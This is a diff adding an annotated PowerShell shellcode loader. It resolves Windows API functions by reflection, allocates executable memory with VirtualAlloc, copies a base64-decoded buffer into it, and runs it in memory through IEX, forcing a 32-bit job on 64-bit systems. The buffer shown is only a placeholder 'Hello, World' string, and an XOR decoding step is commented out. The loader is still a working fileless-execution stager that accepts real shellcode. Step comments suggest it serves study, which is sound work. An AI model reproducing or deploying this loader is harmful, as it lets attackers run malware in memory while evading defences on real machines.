@@ -1,0 +1,67 @@
+#Set-StrictMode -Version 2
+
+$DoIt = @'
+# This function is a wrapper that dynamically locates and invokes the native Windows API function GetProcAddress. 
+# This API is used to find the memory address of a specific function exported by a DLL.
+function func_get_proc_address {
+	# $var_module, the name of the module (typically a DLL) from which you want to get a function( kernel32.dll ) address.
+	# $var_procedure, the name of the procedure (exported function, VirtualAlloc) whose address you want to retrieve
+	Param ($var_module, 	$var_procedure)	
+	
+	$var_unsafe_native_methods = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
+	$var_gpa = $var_unsafe_native_methods.GetMethod('GetProcAddress', [Type[]] @('System.Runtime.InteropServices.HandleRef', 'string'))
+	return $var_gpa.Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($var_unsafe_native_methods.GetMethod('GetModuleHandle')).Invoke($null, @($var_module)))), $var_procedure))
+}
+
+function func_get_delegate_type {
+	# $var_parameters an array of .NET Type objects that represents the delegate’s parameters. This is mandatory and determines the signature’s input types.
+	Param (
+		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $var_parameters,
+		[Parameter(Position = 1)] [Type] $var_return_type = [Void]
+	)
+
+	$var_type_builder = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
+	$var_type_builder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $var_parameters).SetImplementationFlags('Runtime, Managed')
+	$var_type_builder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $var_return_type, $var_parameters).SetImplementationFlags('Runtime, Managed')
+
+	return $var_type_builder.CreateType()
+}
+
+[Byte[]]$var_code = [System.Convert]::FromBase64String('V3JpdGUtSG9zdCgnSGVsbG8sIFdvcmxkISBXZSBsb3ZlIERQMS4yJyk=')
+# XOR 35
+#for ($x = 0; $x -lt $var_code.Count; $x++) {
+#	$var_code[$x] = $var_code[$x] -bxor 35
+#}
+# Creating a Delegate for VirtualAlloc 
+# func1: Retrieves the address of the VirtualAlloc function from kernel32.dll
+# func2: Generate a delegate type that matches the signature of VirtualAlloc, 
+# 	which typically receives four parameters—an IntPtr (starting address), 
+# 	three UInt32 values (size, allocation type, and protection flags)—and 
+# 	returns an IntPtr (the address of the allocated memory).
+$var_va = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
+	(func_get_proc_address kernel32.dll VirtualAlloc), 
+	(func_get_delegate_type @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))
+	)
+
+# Allocating Executable Memory
+$var_buffer = $var_va.Invoke([IntPtr]::Zero, $var_code.Length, 0x3000, 0x40)
+
+# Copying Shellcode($var_code) into the Allocated Buffer
+[System.Runtime.InteropServices.Marshal]::Copy($var_code, 0, $var_buffer, $var_code.length)
+
+# Preparing to Execute the Shellcode
+$var_runme = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($var_buffer, (func_get_delegate_type @([IntPtr]) ([Void])))
+
+# Executing the Shellcode
+$var_runme.Invoke([IntPtr]::Zero)
+'@
+
+# The value of this property is 4 in a 32-bit process, and 8 in a 64-bit process. 
+# https://learn.microsoft.com/en-us/dotnet/api/system.intptr.size?view=net-9.0
+#  
+If ([IntPtr]::size -eq 8) {
+	start-job { param($a) IEX $a } -RunAs32 -Argument $DoIt | wait-job | Receive-Job
+}
+else {
+	IEX $DoIt
+}
